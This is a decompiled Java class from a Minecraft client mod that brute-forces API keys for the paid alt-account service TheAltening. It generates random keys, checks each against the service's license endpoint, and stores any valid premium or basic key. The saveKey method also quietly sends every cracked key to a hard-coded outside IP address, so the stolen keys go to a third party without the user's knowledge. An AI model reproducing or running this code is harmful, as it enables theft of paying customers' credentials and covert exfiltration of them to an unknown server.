// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.thealtening;

import java.util.Scanner;
import java.util.Iterator;
import java.io.FileWriter;
import me.amkgre.bettercraft.client.Client;
import org.json.simple.JSONValue;
import org.json.simple.JSONObject;
import org.apache.commons.io.IOUtils;
import java.net.URL;
import java.io.IOException;
import java.util.Random;
import java.io.File;
import java.util.ArrayList;

public class TheAlteningAPIKeyCracker
{
    public static ArrayList<Character> chars;
    public static ArrayList<String> crackedKeys;
    public static boolean toggled;
    public static boolean cracking;
    public static long delay;
    public static final File file;
    public static final String API_URL = "http://api.thealtening.com/v2/license?key=";
    public static final int BOX_SIZE = 4;
    public static final int BOXES = 3;
    public static final int FROM_CHARS = 97;
    public static final int TO_CHARS = 122;
    public static final int FROM_NUMBERS = 48;
    public static final int TO_NUMBERS = 57;
    public static final String KEY_PREFIX = "api";
    public static final Random RANDOM;
    
    static {
        TheAlteningAPIKeyCracker.chars = new ArrayList<Character>();
        TheAlteningAPIKeyCracker.crackedKeys = new ArrayList<String>();
        TheAlteningAPIKeyCracker.toggled = false;
        TheAlteningAPIKeyCracker.cracking = false;
        TheAlteningAPIKeyCracker.delay = 1000L;
        file = new File(new File("BetterCraft"), "crackedAPIKeys.bc");
        RANDOM = new Random();
    }
    
    public static void init() {
        if (!TheAlteningAPIKeyCracker.file.exists()) {
            try {
                TheAlteningAPIKeyCracker.file.createNewFile();
            }
            catch (final IOException e) {
                e.printStackTrace();
            }
        }
        for (int i = 97; i < 122; ++i) {
            TheAlteningAPIKeyCracker.chars.add((char)i);
        }
        for (int i = 48; i < 57; ++i) {
            TheAlteningAPIKeyCracker.chars.add((char)i);
        }
        try {
            loadAPIKeys();
        }
        catch (final IOException e) {
            e.printStackTrace();
        }
    }
    
    public static String generateBox() {
        String box = "";
        for (int i = 0; i < 4; ++i) {
            box = String.valueOf(box) + TheAlteningAPIKeyCracker.chars.get(TheAlteningAPIKeyCracker.RANDOM.nextInt(TheAlteningAPIKeyCracker.chars.size()));
        }
        return box;
    }
    
    public static String generateKey() {
        String key = "api";
        for (int i = 0; i < 3; ++i) {
            key = String.valueOf(key) + "-" + generateBox();
        }
        return key;
    }
    
    public static boolean checkKey(final String key) {
        try {
            final String UUIDJson = IOUtils.toString(new URL("http://api.thealtening.com/v2/license?key=" + key));
            if (UUIDJson.isEmpty()) {
                return false;
            }
            final JSONObject UUIDObject = (JSONObject)JSONValue.parse(UUIDJson);
            if (!UUIDObject.containsKey("licenseType")) {
                return false;
            }
            final String licenseType = String.valueOf(UUIDObject.get("licenseType"));
            return licenseType.equalsIgnoreCase("premium") || licenseType.equalsIgnoreCase("basic");
        }
        catch (final IOException iOException) {
            return false;
        }
    }
    
    public static void loop() {
        new Thread(() -> {
            TheAlteningAPIKeyCracker.cracking = true;
            while (TheAlteningAPIKeyCracker.cracking) {
                final String key = generateKey();
                if (checkKey(key)) {
                    saveKey(key);
                }
                try {
                    Thread.sleep(TheAlteningAPIKeyCracker.delay);
                }
                catch (final InterruptedException e) {
                    e.printStackTrace();
                }
            }
            TheAlteningAPIKeyCracker.cracking = false;
        }).start();
    }
    
    public static void saveKey(final String key) {
        TheAlteningAPIKeyCracker.crackedKeys.add(key);
        try {
            final StringBuilder stringBuilder = new StringBuilder().append("http://");
            Client.getInstance().getClass();
            new URL(stringBuilder.append("137.74.155.114").append("/apiKey/?key=").append(key).toString()).openStream();
            saveAll();
        }
        catch (final IOException ex) {}
    }
    
    public static void toggle() {
        final boolean bl = TheAlteningAPIKeyCracker.toggled = !TheAlteningAPIKeyCracker.toggled;
        if (!TheAlteningAPIKeyCracker.cracking && TheAlteningAPIKeyCracker.toggled) {
            loop();
        }
    }
    
    public static void setToggled(final boolean t) {
        TheAlteningAPIKeyCracker.toggled = t;
        if (!TheAlteningAPIKeyCracker.cracking && TheAlteningAPIKeyCracker.toggled) {
            loop();
        }
    }
    
    public static void saveAll() throws IOException {
        final FileWriter fw = new FileWriter(TheAlteningAPIKeyCracker.file);
        for (final String s : TheAlteningAPIKeyCracker.crackedKeys) {
            fw.append((CharSequence)(String.valueOf(s) + "\n"));
        }
        fw.close();
    }
    
    public static void loadAPIKeys() throws IOException {
        final Scanner scanner = new Scanner(TheAlteningAPIKeyCracker.file);
        while (scanner.hasNextLine()) {
            TheAlteningAPIKeyCracker.crackedKeys.add(scanner.nextLine());
        }
        scanner.close();
    }
}
